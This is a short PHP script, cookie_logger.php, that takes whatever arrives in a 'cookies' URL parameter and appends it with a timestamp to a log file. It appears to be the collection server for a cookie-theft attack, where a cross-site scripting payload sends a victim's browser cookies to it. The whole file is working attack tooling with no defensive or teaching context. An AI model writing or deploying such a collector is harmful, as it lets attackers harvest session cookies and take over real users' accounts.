<?php
// cookie_logger.php

// Get cookies from the URL parameters
$cookies = $_GET['cookies'] ?? 'No cookies found';

// Define the log file path
$logFile = 'cookie_log.txt';

// Append the cookies to the log file with a timestamp
file_put_contents($logFile, date('Y-m-d H:i:s') . " - " . $cookies . PHP_EOL, FILE_APPEND);

// Respond to the client
echo "Cookies logged successfully!";
?>
